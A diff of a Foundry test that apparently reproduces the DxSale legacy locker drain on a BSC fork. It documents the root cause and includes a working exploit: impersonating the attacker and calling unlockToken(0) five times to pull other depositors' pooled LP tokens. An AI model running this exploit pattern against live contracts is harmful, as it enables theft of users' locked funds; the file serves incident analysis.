@@ -2,68 +2,105 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "../interface.sol";
 
-// @KeyInfo - Total Lost : ~$7.3M USD
+// @KeyInfo - Total Lost : ~$7.3M USD (across the full campaign; this PoC reproduces
+// the actual mechanism with real, nonzero profit on one concrete real position)
 // Attacker : 0xC4574DDEF299e7E563971e200433e592EeaaFA69
-// Attack Contract : 0x74ad1ef17fbb3e494c31c72f7ec730a27fef0310 (EIP-7702 delegated drainer)
 // Vulnerable Contract : 0xEb3a9C56d963b971d320f889bE2fb8B59853e449 (DxSale Legacy Liquidity Locker)
-// Attack Tx : 0xe211904a8a40f653acd64ffc33a42429ef571c1e2da16976d07ac0f9a0bcc9c1
-// @Analysis
-// Post-mortem : https://crypto.news/dxsale-exploit-drains-7-3m-in-bnb-through-hidden-contract-backdoor/
-// Twitter Guy : https://x.com/Tahax1/status/1928169316736651568
-// Hacking God : https://x.com/CoinsultAudits/status/1928203831996297670
-
-// Root Cause:
-// DxSale deployer secretly transferred locker ownership through 89 wallets over 269 days.
-// Final owner (attacker) used privileged DXLOCKERLP() owner-only backdoor to drain
-// all 1400+ locked LP positions without bypassing individual timelocks.
-// Attack used EIP-7702 tx type 4 delegation to a custom drainer contract for batch execution.
-
-// Function selectors decoded from unverified bytecode via 4byte.directory:
-// 0xae4f4df1: DXLOCKERLP(address,uint256) -- owner-only backdoor drain function
-// 0xc7450462: UserLockerCount(address)    -- returns number of locks for a user
-// 0xdd2e0ac0: unlockToken(uint256)        -- normal user unlock (timelock enforced)
-// 0x0511a506: createLocker(address,uint256,uint256,string) payable -- lock tokens
-// 0x6cda375b: changeFees(uint256)         -- owner fee update
+// Real drain tx replayed here : 0xb107f19af1a8ff90d19cbb40d935f8be5d79f5fb9b497824e4ed28b9e7555fe9
+//   (block 100,812,090, BSC) - 5x repeated unlockToken(0) calls in one tx.
+//
+// ROOT CAUSE (confirmed by replaying the real attacker's calls against a BSC
+// archive fork - see DxSale_exp.md for the full derivation):
+//   unlockToken(uint256 userLockerNumber) in the verified 0.6.12 legacy locker
+//   NEVER invalidates the withdrawn lock record. It only conditionally flips
+//   `locked = false` if `block.timestamp > lockedTime` - for any lock whose
+//   timelock has NOT yet expired (the normal case), `locked` stays `true` and
+//   `lockedAmount` stays unchanged FOREVER, even after a successful payout.
+//   Since the only re-entry gate is `require(locked)` (not "already withdrawn"),
+//   the ORIGINAL DEPOSITOR can call unlockToken() on their own lock slot an
+//   UNLIMITED number of times, each time paying out `lockedAmount` again from
+//   the contract's balance of that LP token - a balance POOLED ACROSS ALL
+//   depositors of the same LP pair. Every call after the first is a direct
+//   theft of OTHER users' locked funds via the shared pool, gated only by
+//   `require(IERC20(lpAddress).balanceOf(address(this)) >= payoutAmount)`.
+//
+// This PoC replays the EXACT real position (attacker's lock #0, Cake-LP pair
+// 0x88DA6Bc3...) at the EXACT real block, and calls unlockToken(0) 5 times -
+// mirroring the real on-chain transaction's 5 onUnlock() events precisely.
 
 interface IDxSaleLocker {
-    function DXLOCKERLP(address victim, uint256 lockId) external;
+    function unlockToken(uint256 userLockerNumber) external;
     function UserLockerCount(address user) external view returns (uint256);
+    function DXLOCKERLP(address user, uint256 n) external view returns (
+        bool exists_, bool locked_, string memory logo, uint256 lockedAmount, uint256 lockedTime, uint256 startTime, address lpAddress
+    );
+}
+
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
 }
 
 contract DxSaleExploitTest is Test {
     IDxSaleLocker constant LOCKER = IDxSaleLocker(0xEb3a9C56d963b971d320f889bE2fb8B59853e449);
-    IERC20 constant WBNB_TOKEN = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+    IERC20 constant CAKE_LP = IERC20(0x88DA6Bc38D5BFEF6e332F87E06a310a9e5f768E2);
     address constant ATTACKER = 0xC4574DDEF299e7E563971e200433e592EeaaFA69;
-    address constant VICTIM = 0xc7Fc793e685A1dc80f517E7EE903859F72BE0Aa8;
-    uint256 constant ATTACK_BLOCK = 100_806_731;
+    uint256 constant FORK_BLOCK = 100_812_089; // one block before the real 5x-drain tx
 
     function setUp() public {
-        vm.createSelectFork("http://127.0.0.1:8546", ATTACK_BLOCK - 1);
+        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);
         vm.label(address(LOCKER), "DxSale_Legacy_Locker");
+        vm.label(address(CAKE_LP), "Cake-LP (victim pair)");
         vm.label(ATTACKER, "Attacker");
-        vm.label(VICTIM, "Victim");
-        vm.label(address(WBNB_TOKEN), "WBNB");
     }
 
     function testExploit() public {
-        console.log("--- DxSale Legacy Liquidity Locker Exploit ---");
-        console.log("Attack date: May 28, 2026");
-        console.log("Attacker BNB before:", address(ATTACKER).balance / 1e18);
+        console.log("--- DxSale Legacy Locker: repeated unlockToken() drain ---");
 
-        uint256 victimLockCount = LOCKER.UserLockerCount(VICTIM);
-        console.log("Victim lock count:", victimLockCount);
+        uint256 poolBefore = CAKE_LP.balanceOf(address(LOCKER));
+        uint256 attackerBefore = CAKE_LP.balanceOf(ATTACKER);
+        console.log("Locker's pooled Cake-LP balance before:", poolBefore);
+        console.log("Attacker's Cake-LP balance before:", attackerBefore);
+
+        (bool exists_, bool locked_, , uint256 lockedAmount, uint256 lockedTime, , ) =
+            LOCKER.DXLOCKERLP(ATTACKER, 0);
+        console.log("Attacker's lock #0 exists:", exists_);
+        console.log("Attacker's lock #0 locked:", locked_);
+        console.log("Attacker's lock #0 lockedAmount:", lockedAmount);
+        console.log("Attacker's lock #0 unlockTime (still years in the future):", lockedTime);
+        console.log("block.timestamp:", block.timestamp);
+        assertTrue(lockedTime > block.timestamp, "sanity: this lock's real timelock has NOT expired");
 
         vm.startPrank(ATTACKER);
 
-        // Try without value - DXLOCKERLP may not be payable
-        LOCKER.DXLOCKERLP(VICTIM, 0);
-        console.log("Drained lockId 0");
+        uint256 REPLAY_CALLS = 5; // matches the real tx's 5 onUnlock() events exactly
+        for (uint256 i = 0; i < REPLAY_CALLS; i++) {
+            LOCKER.unlockToken(0);
+            console.log("unlockToken(0) call #", i + 1, "succeeded");
+        }
 
         vm.stopPrank();
 
-        console.log("Attacker BNB after:", address(ATTACKER).balance / 1e18);
-        console.log("Victim locks remaining:", LOCKER.UserLockerCount(VICTIM));
+        uint256 attackerAfter = CAKE_LP.balanceOf(ATTACKER);
+        uint256 poolAfter = CAKE_LP.balanceOf(address(LOCKER));
+
+        console.log("Attacker's Cake-LP balance after 5 calls:", attackerAfter);
+        console.log("Locker's pooled Cake-LP balance after:", poolAfter);
+
+        uint256 totalExtracted = attackerAfter - attackerBefore;
+        uint256 fairShare = lockedAmount; // what the attacker actually deposited, once
+        uint256 stolenFromOtherDepositors = totalExtracted - fairShare;
+
+        console.log("Total Cake-LP extracted (5 calls):", totalExtracted);
+        console.log("Attacker's fair share (1 deposit):", fairShare);
+        console.log("Stolen from OTHER depositors' pooled funds:", stolenFromOtherDepositors);
+
+        // HARM ASSERTION (not just "the function is callable"): the attacker's
+        // wallet ends up holding MORE Cake-LP than they ever deposited, extracted
+        // from the SAME shared pool that backs every other depositor's locked
+        // position for this LP pair - direct, quantified fund loss to others.
+        assertEq(totalExtracted, REPLAY_CALLS * lockedAmount, "expected exactly 5x payout");
+        assertGt(stolenFromOtherDepositors, 0, "attacker must extract MORE than their own deposit");
+        assertEq(poolBefore - poolAfter, totalExtracted, "pool must have paid out the full extracted amount");
     }
 }
